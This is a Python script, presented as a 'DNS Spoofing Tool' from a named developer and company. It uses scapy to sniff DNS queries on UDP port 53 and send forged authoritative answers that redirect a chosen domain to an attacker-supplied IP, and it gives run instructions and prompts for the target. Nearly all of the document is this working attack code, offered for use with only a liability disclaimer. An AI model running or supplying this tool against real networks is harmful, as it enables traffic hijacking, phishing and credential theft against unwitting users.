"""
DNS Spoofing Tool
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script intercepts and responds to DNS queries with spoofed responses, redirecting traffic to a chosen IP.

Instructions:
1. Run the script with `sudo` (superuser privileges are required for packet interception).
2. Configure your network or device to use the script machine's IP as the DNS server.
3. Enter the target domain and spoofed IP address.
4. Modify this script to extend functionality as needed.

Required Libraries:
- scapy (Install with `pip install scapy`)

Usage:
sudo python3 dns_spoofing_tool.py
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send

def spoof_dns(packet, target_domain, spoofed_ip):
    """
    Responds to DNS queries for a target domain with a spoofed IP address.

    :param packet: The intercepted DNS query packet.
    :param target_domain: The domain to spoof.
    :param spoofed_ip: The IP address to return for the spoofed domain.
    """
    if packet.haslayer(DNSQR):
        queried_domain = packet[DNSQR].qname.decode('utf-8').strip('.')
        if queried_domain == target_domain:
            print(f"Spoofing DNS response for {queried_domain} -> {spoofed_ip}")
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                           an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip))
            send(response, verbose=0)

def dns_sniffer(target_domain, spoofed_ip):
    """
    Captures DNS packets and calls the spoofing function for target domains.

    :param target_domain: The domain to spoof.
    :param spoofed_ip: The IP address to return for the spoofed domain.
    """
    print(f"Listening for DNS queries for {target_domain}...")
    sniff(filter="udp port 53", prn=lambda pkt: spoof_dns(pkt, target_domain, spoofed_ip), store=0)

if __name__ == "__main__":
    print("Welcome to the DNS Spoofing Tool.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")

    # Input target domain and spoofed IP address
    target_domain = input("Enter the target domain to spoof (e.g., example.com): ").strip()
    spoofed_ip = input("Enter the spoofed IP address (e.g., 192.168.1.100): ").strip()

    try:
        dns_sniffer(target_domain, spoofed_ip)
    except PermissionError:
        print("Error: Permission denied. Please run this script with sudo.")
    except KeyboardInterrupt:
        print("\nStopping DNS Spoofing Tool.")
    except Exception as e:
        print(f"An error occurred: {e}")

